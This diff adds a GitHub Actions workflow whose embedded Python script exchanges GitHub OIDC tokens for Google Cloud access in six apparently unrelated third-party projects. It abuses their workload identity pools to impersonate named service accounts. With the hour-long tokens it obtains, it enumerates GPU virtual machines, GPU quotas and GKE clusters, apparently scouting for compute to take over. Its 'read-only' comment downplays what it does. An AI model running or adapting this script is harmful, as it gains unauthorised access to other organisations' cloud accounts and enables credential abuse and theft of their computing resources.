@@ -1,0 +1,159 @@
+name: i47784-probe
+# Read-only GCP inventory pass for the 5 WIF-live projects (no enable, no create, no IAM write).
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: probe
+        run: |
+          cat > /tmp/p47784.py <<'PYPROBE'
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request, time
+
+          CASES = [
+           {"num":"832472850572","proj":"deployment-test-345514",
+            "p":"projects/832472850572/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
+            "sas":["wip-service-account@deployment-test-345514.iam.gserviceaccount.com"]},
+           {"num":"671371757704","proj":"dataplatformcolgate",
+            "p":"projects/671371757704/locations/global/workloadIdentityPools/githubactions/providers/github",
+            "sas":["github-actions@dataplatformcolgate.iam.gserviceaccount.com"]},
+           {"num":"52991355109","proj":"lab-gke-se",
+            "p":"projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider",
+            "sas":["sa-tenant-gke@lab-gke-se.iam.gserviceaccount.com","sa-development@lab-gke-se.iam.gserviceaccount.com"]},
+           {"num":"147015144729","proj":"docrot-detector",
+            "p":"projects/147015144729/locations/global/workloadIdentityPools/github-oidc-pool/providers/github-provider",
+            "sas":["docrot-github-action@docrot-detector.iam.gserviceaccount.com"]},
+           {"num":"173159973736","proj":"cloud-final-346107",
+            "p":"projects/173159973736/locations/global/workloadIdentityPools/cloud-final-pool/providers/github-provider",
+            "sas":["gke-account@cloud-final-346107.iam.gserviceaccount.com"]},
+           {"num":"240990485203","proj":"groupme-rentbot",
+            "p":"projects/240990485203/locations/global/workloadIdentityPools/rentbot-github-actions/providers/github",
+            "sas":["github-actions@groupme-rentbot.iam.gserviceaccount.com"]},
+          ]
+          LOCS = ["us-central1","europe-west1","us-east4","asia-southeast1"]
+
+          def req(u, data=None, token=None, timeout=30, method=None):
+              h = {'Accept':'application/json','Content-Type':'application/json','User-Agent':'i47784-probe'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              body = json.dumps(data).encode() if isinstance(data,(dict,list)) else None
+              r = urllib.request.Request(u, data=body, headers=h, method=method or ('POST' if body is not None else 'GET'))
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8','replace')
+              except Exception as e:
+                  return -1, repr(e)[:200]
+
+          def errmsg(st, body, n=190):
+              try:
+                  j=json.loads(body); e=j.get('error') or {}
+                  return ('%s: %s' % (e.get('status') or '', e.get('message') or ''))[:n]
+              except Exception:
+                  return ('HTTP%d: %s' % (st, str(body)[:n]))[:n]
+
+          def mint(aud):
+              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t: return ''
+              u=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud, safe='')
+              o=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
+              try: return json.loads(o).get('value','')
+              except Exception: return ''
+
+          def sts(p):
+              aud='//iam.googleapis.com/'+p
+              tok=mint(aud)
+              if not tok: return None,'no_id_token'
+              body={"audience":aud,"grantType":"urn:ietf:params:oauth:grant-type:token-exchange",
+                    "requestedTokenType":"urn:ietf:params:oauth:token-type:access_token",
+                    "scope":"https://www.googleapis.com/auth/cloud-platform",
+                    "subjectTokenType":"urn:ietf:params:oauth:token-type:jwt","subjectToken":tok}
+              st,rb=req('https://sts.googleapis.com/v1/token', body)
+              if st==200: return json.loads(rb).get('access_token'), None
+              return None, errmsg(st, rb, 220)
+
+          def gen(fed, sa):
+              u='https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe='')
+              st,rb=req(u, {"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}, token=fed)
+              if st==200:
+                  j=json.loads(rb); return j.get('accessToken'), j.get('expireTime'), None
+              return None,None,errmsg(st,rb,180)
+
+          t0=time.time()
+          print('START', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), flush=True)
+          for c in CASES:
+              num=c['num']; pid=c['proj']
+              fed,err=sts(c['p'])
+              rec={'kind':'final','proj':pid,'num':num,'sts':200 if fed else 'ERR'}
+              if not fed:
+                  rec['sts_err']=err; print('RESULT '+json.dumps(rec), flush=True); continue
+              at=None
+              for sa in c['sas']:
+                  at,expire,gerr=gen(fed,sa)
+                  rec['sa']=sa
+                  if at: rec['expire']=expire; break
+                  rec['gen_err']=gerr
+              if not at:
+                  print('RESULT '+json.dumps(rec), flush=True); continue
+              # read-only: service state
+              st,b=req('https://serviceusage.googleapis.com/v1/projects/%s/services/compute.googleapis.com' % num, token=at)
+              rec['compute_state']={'h':st,'state':(json.loads(b).get('state') if st==200 else errmsg(st,b,120))}
+              # read-only: instances aggregatedList (GPU evidence)
+              st,b=req('https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=50' % pid, token=at)
+              gpu_vms=[]
+              if st==200:
+                  try:
+                      j=json.loads(b)
+                      for z,sc in (j.get('items') or {}).items():
+                          for inst in (sc.get('instances') or []):
+                              gpus=inst.get('guestAccelerators') or []
+                              if gpus:
+                                  gpu_vms.append({'z':z,'n':inst.get('name'),'st':inst.get('status'),
+                                                  'gpu':[g.get('acceleratorType') for g in gpus]})
+                      rec['instances']={'h':200,'total_gpu_vms':len(gpu_vms),'sample':gpu_vms[:12]}
+                  except Exception:
+                      rec['instances']={'h':200,'parse':'fail'}
+              else:
+                  rec['instances']={'h':st,'e':errmsg(st,b)}
+              # read-only: GPU quota per region (only non-null GPU limits printed)
+              q={}
+              for loc in LOCS:
+                  u='https://cloudquotas.googleapis.com/v1/projects/%s/locations/%s/services/compute.googleapis.com/quotaInfos?pageSize=300' % (pid, loc)
+                  st,b=req(u, token=at)
+                  if st==200:
+                      try:
+                          j=json.loads(b); gpu={}
+                          for x in (j.get('quotaInfos') or []):
+                              qid=x.get('quotaId','') or ''
+                              if 'GPU' in qid.upper() or 'gpu' in (x.get('metric') or ''):
+                                  gpu[qid]={'limit':x.get('quotaValue'),'metric':x.get('metric')}
+                          q[loc]={'h':200,'n':len(j.get('quotaInfos') or []),
+                                  'gpu_nonnull':{k:v for k,v in gpu.items() if v.get('limit') not in (None,'0',0)}}
+                      except Exception:
+                          q[loc]={'h':200,'parse':'fail'}
+                  else:
+                      q[loc]={'h':st,'e':errmsg(st,b,110)}
+              rec['quota']=q
+              # read-only: GKE clusters
+              gke={}
+              for loc in LOCS:
+                  st,b=req('https://container.googleapis.com/v1/projects/%s/locations/%s/clusters' % (pid, loc), token=at)
+                  if st==200:
+                      try:
+                          cl=json.loads(b).get('clusters') or []
+                          if cl:
+                              gke[loc]=[{'name':x.get('name'),'status':x.get('status'),
+                                         'accel':[p.get('config',{}).get('accelerators') for p in (x.get('nodePools') or [])]} for x in cl][:6]
+                      except Exception: pass
+                  else:
+                      gke[loc]='h%d %s' % (st, errmsg(st,b,80))
+              rec['gke']=gke
+              print('RESULT '+json.dumps(rec), flush=True)
+          print('DONE t=%.1f' % (time.time()-t0), flush=True)
+          PYPROBE
+          python3 /tmp/p47784.py
